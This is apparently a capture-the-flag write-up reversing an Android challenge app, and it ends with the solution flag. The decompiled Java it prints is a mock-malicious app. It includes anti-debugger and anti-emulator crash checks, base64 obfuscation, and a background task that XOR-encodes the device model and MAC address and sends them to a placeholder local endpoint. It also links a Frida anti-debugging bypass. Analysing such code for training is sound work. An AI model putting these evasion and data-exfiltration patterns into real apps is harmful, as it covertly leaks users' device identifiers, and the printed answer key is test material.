Sorry for my bed england 
# Reversee engineering

## free delivery

### Description:
```
Mr. Krabs has decided to make a new food delivery app for the Krusty Krab but Plankton decided to make his own patched version. Loyal Krusty Krab customers are saying weird network traffic and shell commands are coming from the app! Can you figure out what's going on?```

### Solution:

First, we upload the app on jadx. By taking a look at the AndroidManifest.xml, we can tell that the main activity is at `com.example.freedelivery.MainActivity`.

```java
public class MainActivity extends androidx.appcompat.app.e implements View.OnClickListener {

    /* renamed from: e  reason: collision with root package name */
    public String f12219e = X0("Zw==");

    /* renamed from: f  reason: collision with root package name */
    public String f12220f = Build.MODEL;

    /* renamed from: a  reason: collision with root package name */
    public String[] f12217a = {this.f12219e + X0("b28=") + this.f12219e + X0("bGU="), X0("c2Rr"), X0("eA=="), String.valueOf(Z0()), X0("YXJtC" + this.f12219e + "=="), X0("dWxhdG9y")};

    /* renamed from: b  reason: collision with root package name */
    public String[] f12218b = {this.f12217a[4] + this.f12217a[4], this.f12219e + X0("ZW5lcmlj"), this.f12217a[4] + this.f12217a[5], X0("dW5rbm93b" + this.f12219e + "=="), this.f12219e + X0("b2xkZmlzaA=="), X0("cmFuY2h1"), this.f12217a[0] + "_" + this.f12217a[1], "Em" + this.f12217a[5], "Android " + this.f12217a[1].toUpperCase() + X0("IGJ1aWx0IGZvciB4") + this.f12217a[3], X0("R2VueW1vdGlvbg=="), X0("c2Rr"), X0("c2lt") + this.f12217a[5], X0("ZW0=") + this.f12217a[5]};

    /* loaded from: classes.dex */
    public class a extends AsyncTask<Void, Void, String> {
        public a() {
        }

        @Override // android.os.AsyncTask
        /* renamed from: a */
        public String doInBackground(Void... voidArr) {
            try {
                MainActivity mainActivity = MainActivity.this;
                StringBuilder sb = new StringBuilder();
                sb.append(MainActivity.X0("aHR0cDovLzEyNy4wLjAuMToxMjU0"));
                MainActivity mainActivity2 = MainActivity.this;
                sb.append(mainActivity2.a1(mainActivity2.f12220f));
                mainActivity.Q0(sb.toString());
                MainActivity mainActivity3 = MainActivity.this;
                StringBuilder sb2 = new StringBuilder();
                sb2.append(MainActivity.X0("aHR0cDovLzEyNy4wLjAuMToxMjU0"));
                MainActivity mainActivity4 = MainActivity.this;
                sb2.append(mainActivity4.a1(mainActivity4.W0()));
                mainActivity3.Q0(sb2.toString());
                MainActivity mainActivity5 = MainActivity.this;
                mainActivity5.Q0(MainActivity.X0("aHR0cDovLzEyNy4wLjAuMToxMjU0") + "AzE9Omd0eG8XHhEcHTx1Nz0dN2MjfzF2MDYdICE6fyMa");
                return "";
            } catch (Exception e8) {
                e8.printStackTrace();
                return "";
            }
        }
    }

    /* loaded from: classes.dex */
    public static class rgae {
        public static String a() {
            return t();
        }

        public static String b() {
            return MainActivity.X0("T3JkZXJlZCBLZWxwIFNoYWtlIQ==");
        }

        private static native String t();
    }

    static {
        System.loadLibrary("freedelivery");
    }

    public static String X0(String str) {
        return Y0(Base64.decode(str, 0));
    }

    public static String Y0(byte[] bArr) {
        return new String(bArr, StandardCharsets.UTF_8);
    }

    public String N0() {
        if (V0() || P0() || R0() || S0() || U0()) {
            int i8 = 0 / 0;
        } else if (((ConnectivityManager) getSystemService("connectivity")).getActiveNetworkInfo() != null) {
            new a().execute(new Void[0]);
        }
        return X0("T3JkZXJlZCBLaWRkaWUgTWVhbCE=");
    }

    public void O0(String str) {
        try {
            ((HttpURLConnection) new URL(str).openConnection()).getInputStream();
        } catch (Exception unused) {
        }
    }

    public boolean P0() {
        return Build.BRAND.startsWith(this.f12218b[1]) && Build.DEVICE.startsWith(this.f12218b[1]);
    }

    public void Q0(String str) {
        Instant instant;
        ZoneId systemDefault;
        ZonedDateTime atZone;
        LocalDate localDate;
        int year;
        if (Build.VERSION.SDK_INT >= 26) {
            instant = new Date().toInstant();
            systemDefault = ZoneId.systemDefault();
            atZone = instant.atZone(systemDefault);
            localDate = atZone.toLocalDate();
            year = localDate.getYear();
            if (year <= (Z0() * 23) + 45) {
                V0();
            } else {
                O0(str);
            }
        }
    }

    public boolean R0() {
        String str = Build.FINGERPRINT;
        if (str.startsWith(this.f12218b[1]) || str.startsWith(this.f12218b[3])) {
            return true;
        }
        String str2 = Build.HARDWARE;
        return str2.contains(this.f12218b[4]) || str2.contains(this.f12218b[5]);
    }

    public boolean S0() {
        String str = Build.MODEL;
        return str.contains(this.f12218b[6]) || str.contains(this.f12218b[7]) || str.contains(this.f12218b[8]);
    }

    public String T0() {
        if (V0() || P0() || R0() || S0() || U0()) {
            int i8 = 0 / 0;
        }
        return X0("T3JkZXJlZCBLcmFiYnkgUGF0dHkh");
    }

    public boolean U0() {
        if (!Build.MANUFACTURER.contains(this.f12218b[9])) {
            String str = Build.PRODUCT;
            if (!str.contains(this.f12218b[10]) && !str.contains(this.f12218b[11]) && !str.contains(this.f12218b[12])) {
                return false;
            }
        }
        return true;
    }

    public boolean V0() {
        return Debug.isDebuggerConnected();
    }

    public String W0() {
        return ((WifiManager) getSystemService("wifi")).getConnectionInfo().getMacAddress();
    }

    public int Z0() {
        return 86;
    }

    public String a1(String str) {
        return Base64.encodeToString(b1(str.getBytes(StandardCharsets.UTF_8)), 0);
    }

    public byte[] b1(byte[] bArr) {
        byte[] bytes = "SPONGEBOBSPONGEBOBSPONGEBOBSPONGEBOBSPONGEBOB".getBytes();
        for (int i8 = 0; i8 < bArr.length; i8++) {
            bArr[i8] = (byte) (bArr[i8] ^ bytes[i8 % bytes.length]);
        }
        return bArr;
    }

    @Override // android.view.View.OnClickListener
    public void onClick(View view) {
        String b8;
        if (V0() || P0() || R0() || S0() || U0()) {
            int i8 = 0 / 0;
        }
        switch (view.getId()) {
            case R.id.eraoieg /* 2131230899 */:
                Toast.makeText(this, Z0(), 0);
                return;
            case R.id.iaovenear /* 2131230934 */:
                b8 = rgae.b();
                break;
            case R.id.vireaiun /* 2131231209 */:
                b8 = N0();
                break;
            case R.id.vrvearinvaie /* 2131231212 */:
                b8 = T0();
                break;
            case R.id.vueairva /* 2131231213 */:
                Toast.makeText(this, this.f12219e, 0);
                return;
            default:
                b8 = rgae.a();
                break;
        }
        Toast.makeText(this, b8, 0).show();
    }

    @Override // androidx.fragment.app.e, androidx.activity.ComponentActivity, n0.q, android.app.Activity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_main);
    }
}```

the code is a pain to read, so let's figure out what each function does and rename them accordingly


```java
public class MainActivity extends androidx.appcompat.app.e implements View.OnClickListener {

    /* renamed from: e  reason: collision with root package name */
    public String f12217e = b64decode("Zw==");

    /* renamed from: f */
    public String build_model = Build.MODEL;

    /* renamed from: a */
    public String[] orig_string = {this.f12217e + b64decode("b28=") + this.f12217e + b64decode("bGU="), b64decode("c2Rr"), b64decode("eA=="), String.valueOf(return_86()), b64decode("YXJtC" + this.f12217e + "=="), b64decode("dWxhdG9y")};
    // forms the string "googlesdkx86arm\nulator"

    /* renamed from: b */
    public String[] new_string = {this.orig_string[4] + this.orig_string[4], this.f12217e + b64decode("ZW5lcmlj"), this.orig_string[4] + this.orig_string[5], b64decode("dW5rbm93b" + this.f12217e + "=="), this.f12217e + b64decode("b2xkZmlzaA=="), b64decode("cmFuY2h1"), this.orig_string[0] + "_" + this.orig_string[1], "Em" + this.orig_string[5], "Android " + this.orig_string[1].toUpperCase() + b64decode("IGJ1aWx0IGZvciB4") + this.orig_string[3], b64decode("R2VueW1vdGlvbg=="), b64decode("c2Rr"), b64decode("c2lt") + this.orig_string[5], b64decode("ZW0=") + this.orig_string[5]};

    /* loaded from: classes.dex */
    public class a extends AsyncTask<Void, Void, String> {
        public a() {
        }

        @Override // android.os.AsyncTask
        /* renamed from: a */
        public String doInBackground(Void... voidArr) {
            try {
                MainActivity mainActivity = MainActivity.this;
                StringBuilder sb = new StringBuilder();
                sb.append(MainActivity.b64decode("aHR0cDovLzEyNy4wLjAuMToxMjU0"));
                MainActivity mainActivity2 = MainActivity.this;
                sb.append(mainActivity2.b64_spongebob_encode(mainActivity2.build_model));
                mainActivity.socket_if_year_above_46597(sb.toString());
                MainActivity mainActivity3 = MainActivity.this;
                StringBuilder sb2 = new StringBuilder();
                sb2.append(MainActivity.b64decode("aHR0cDovLzEyNy4wLjAuMToxMjU0"));
                MainActivity mainActivity4 = MainActivity.this;
                sb2.append(mainActivity4.b64_spongebob_encode(mainActivity4.get_wifi_macaddress()));
                mainActivity3.socket_if_year_above_46597(sb2.toString());
                MainActivity mainActivity5 = MainActivity.this;
                mainActivity5.socket_if_year_above_46597(MainActivity.b64decode("aHR0cDovLzEyNy4wLjAuMToxMjU0") + "AzE9Omd0eG8XHhEcHTx1Nz0dN2MjfzF2MDYdICE6fyMa");
                return "";
            } catch (Exception e8) {
                e8.printStackTrace();
                return "";
            }
        }
    }

    /* loaded from: classes.dex */
    public static class rgae {
        /* renamed from: a */
        public static String string_from_native() {
            return t();
        }

        /* renamed from: b */
        public static String string_ordered_kelp_shake() {
            return MainActivity.b64decode("T3JkZXJlZCBLZWxwIFNoYWtlIQ==");
        }

        private static native String t();
    }

    static {
        System.loadLibrary("freedelivery");
    }

    /* renamed from: X0 */
    public static String b64decode(String str) {
        return build_string(Base64.decode(str, 0));
    }

    /* renamed from: Y0 */
    public static String build_string(byte[] bArr) {
        return new String(bArr, StandardCharsets.UTF_8);
    }

    /* renamed from: N0 */
    public String string_kiddie_meal() {
        if (check_debugger() || check_device_model() || check_device_fingerprint_and_hardware() || check_model() || check_manufacturer()) {
            int i8 = 0 / 0;
        } else if (((ConnectivityManager) getSystemService("connectivity")).getActiveNetworkInfo() != null) { // //if there's connectivity, clicking on kiddie meal will trigger the socket method thingie
            new a().execute(new Void[0]);
        }
        return b64decode("T3JkZXJlZCBLaWRkaWUgTWVhbCE=");
    }

    /* renamed from: O0 */
    public void read_from_socket(String str) {
        try {
            ((HttpURLConnection) new URL(str).openConnection()).getInputStream();
        } catch (Exception unused) {
        }
    }

    /* renamed from: P0 */
    public boolean check_device_model() {
        return Build.BRAND.startsWith(this.new_string[1]) && Build.DEVICE.startsWith(this.new_string[1]);
    }

    /* renamed from: Q0 */
    public void socket_if_year_above_46597(String str) {
        Instant instant;
        ZoneId systemDefault;
        ZonedDateTime atZone;
        LocalDate localDate;
        int year;
        if (Build.VERSION.SDK_INT >= 26) { // check if android ver is >= 8.0
            instant = new Date().toInstant();
            systemDefault = ZoneId.systemDefault();
            atZone = instant.atZone(systemDefault);
            localDate = atZone.toLocalDate();
            year = localDate.getYear();
            if (year <= (return_86() * 23) + 45) {
                check_debugger();
            } else {
                read_from_socket(str);
            }
        }
    }

    /* renamed from: R0 */
    public boolean check_device_fingerprint_and_hardware() {
        String build_fingerprint = Build.FINGERPRINT;
        if (build_fingerprint.startsWith(this.new_string[1]) || build_fingerprint.startsWith(this.new_string[3])) {
            return true;
        }
        String build_hardware = Build.HARDWARE;
        return build_hardware.contains(this.new_string[4]) || build_hardware.contains(this.new_string[5]);
    }

    /* renamed from: S0 */
    public boolean check_model() {
        String build_model = Build.MODEL;
        return build_model.contains(this.new_string[6]) || build_model.contains(this.new_string[7]) || build_model.contains(this.new_string[8]);
    }

    /* renamed from: T0 */
    public String string_krabby_patty() {
        if (check_debugger() || check_device_model() || check_device_fingerprint_and_hardware() || check_model() || check_manufacturer()) {
            int i8 = 0 / 0; // makes app crash cuz dividing by zero
        }
        return b64decode("T3JkZXJlZCBLcmFiYnkgUGF0dHkh");
    }

    /* renamed from: U0 */
    public boolean check_manufacturer() {
        if (!Build.MANUFACTURER.contains(this.new_string[9])) {
            String build_product = Build.PRODUCT;
            if (!build_product.contains(this.new_string[10]) && !build_product.contains(this.new_string[11]) && !build_product.contains(this.new_string[12])) {
                return false;
            }
        }
        return true;
    }

    /* renamed from: V0 */
    public boolean check_debugger() {
        return Debug.isDebuggerConnected();
    }

    /* renamed from: W0 */
    public String get_wifi_macaddress() {
        return ((WifiManager) getSystemService("wifi")).getConnectionInfo().getMacAddress();
    }

    /* renamed from: Z0 */
    public int return_86() {
        return 86;
    }

    /* renamed from: a1 */
    public String b64_spongebob_encode(String str) {
        return Base64.encodeToString(spongebob_encode(str.getBytes(StandardCharsets.UTF_8)), 0);
    }

    /* renamed from: b1 */
    public byte[] spongebob_encode(byte[] bArr) {
        byte[] bytes = "SPONGEBOBSPONGEBOBSPONGEBOBSPONGEBOBSPONGEBOB".getBytes();
        for (int i8 = 0; i8 < bArr.length; i8++) {
            bArr[i8] = (byte) (bArr[i8] ^ bytes[i8 % bytes.length]);
        }
        return bArr;
    }

    @Override // android.view.View.OnClickListener
    public void onClick(View view) {
        String string_ordered_food;
        if (check_debugger() || check_device_model() || check_device_fingerprint_and_hardware() || check_model() || check_manufacturer()) {
            int i8 = 0 / 0;
        }
        switch (view.getId()) {
            case R.id.res_krabby_patty_img /* 2131230899 */:
                Toast.makeText(this, return_86(), 0); // ignore, no .show()
                return;
            case R.id.iaovenear /* 2131230934 */:
                string_ordered_food = rgae.string_ordered_kelp_shake();
                break;
            case R.id.res_order_button /* 2131231209 */:
                string_ordered_food = string_kiddie_meal();
                break;
            case R.id.res_order_button2 /* 2131231212 */:
                string_ordered_food = string_krabby_patty();
                break;
            case R.id.res_krabby_meal_img /* 2131231213 */:
                Toast.makeText(this, this.f12217e, 0); // ignore, no .show()
                return;
            default:
                string_ordered_food = rgae.string_from_native();
                break;
        }
        Toast.makeText(this, string_ordered_food, 0).show();
    }

    @Override // androidx.fragment.app.e, androidx.activity.ComponentActivity, n0.q, android.app.Activity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_main);
    }
}```


We can see that there's a bunch of anti-debug and anti-emulator functions preventing us from clicking on the order buttons, but since I am using an androidx86 VM instead of an emulator, I am not affected by these. (you could use frida hooks to prevent anti-debugging techniques : https://codeshare.frida.re/@meerkati/universal-android-debugging-bypass/)


Next, we notice an interesting function : 

```java
 public String string_kiddie_meal() {
        if (check_debugger() || check_device_model() || check_device_fingerprint_and_hardware() || check_model() || check_manufacturer()) {
            int i8 = 0 / 0;
        } else if (((ConnectivityManager) getSystemService("connectivity")).getActiveNetworkInfo() != null) { // //if there's connectivity, clicking on kiddie meal will trigger the socket method thingie
            new a().execute(new Void[0]);
        }
        return b64decode("T3JkZXJlZCBLaWRkaWUgTWVhbCE=");
    }
```

this function is related to the top right "kiddie meal" button, like for the 3 other products, it returns its base64 encoded product string. But before doing so, it executes an async task : 

```java
public String doInBackground(Void... voidArr) {
            try {
                MainActivity mainActivity = MainActivity.this;
                StringBuilder sb = new StringBuilder();
                sb.append(MainActivity.b64decode("aHR0cDovLzEyNy4wLjAuMToxMjU0"));
                MainActivity mainActivity2 = MainActivity.this;
                sb.append(mainActivity2.b64_spongebob_encode(mainActivity2.build_model));
                mainActivity.socket_if_year_above_46597(sb.toString());
                MainActivity mainActivity3 = MainActivity.this;
                StringBuilder sb2 = new StringBuilder();
                sb2.append(MainActivity.b64decode("aHR0cDovLzEyNy4wLjAuMToxMjU0"));
                MainActivity mainActivity4 = MainActivity.this;
                sb2.append(mainActivity4.b64_spongebob_encode(mainActivity4.get_wifi_macaddress()));
                mainActivity3.socket_if_year_above_46597(sb2.toString());
                MainActivity mainActivity5 = MainActivity.this;
                mainActivity5.socket_if_year_above_46597(MainActivity.b64decode("aHR0cDovLzEyNy4wLjAuMToxMjU0") + "AzE9Omd0eG8XHhEcHTx1Nz0dN2MjfzF2MDYdICE6fyMa");
                return "";
            } catch (Exception e8) {
                e8.printStackTrace();
                return "";
            }
        }
```

notice the last `socket_if_year_above_46597()` function call, if you take the second part of the base64 string and (by guessing a bit) apply the `b64_spongebob_encode()` function on it, you get ... the first part of the flag ! 

https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)XOR(%7B'option':'UTF8','string':'SPONGEBOBSPONGEBOBSPONGEBOBSPONGEBOBSPONGEBOB'%7D,'Standard',false)&input=QXpFOU9tZDBlRzhYSGhFY0hUeDFOejBkTjJNamZ6RjJNRFlkSUNFNmZ5TWE

`UMASS{0ur_d3l1v3ry_squ1d_`

Now, we need to figure out the second part of the flag.

By analyzing a bit more the apk, we can see that one of the button is fetching a string from a native library `private static native String t();`, so let's unzip the apk and look at the `lib/*/` directory.

we know here that the appropriate library is libfreedelivery.so because it is the one that's being loaded in the MainActivity : 

```java
static {
        System.loadLibrary("freedelivery");
    }
```

So let's reverse it.

With a bit of googling we know that the method android looks for in the native library should start with Java_com_example_freedelivery (https://stackoverflow.com/questions/65513492/how-to-find-the-native-c-function-who-called-a-java-method-in-a-android-app-an)

we notice a xor operation being made : 
```
local_4c[iVar3] = (&DAT_00017cf5)[iVar3] ^ 0x55;
```

by reproducing it we get : `echo "Part Two: w1ll_br1ng_1t_r1ght_0v3r_!}"` (https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'55'%7D,'Standard',false)&input=MzYgM2QgM2EgNzUgNzcgMDUgMzQgMjcgMjEgNzUgMDEgMjIgM2EgNmYgNzUgMjIgNjQgMzkgMzkgMGEgMzcgMjcgNjQgM2IgMzIgMGEgNjQgMjEgMGEgMjcgNjQgMzIgM2QgMjEgMGEgNjUgMjMgNjYgMjcgMGEgNzQgMjggNzcgNTU&ienc=65001)

we got our flag !

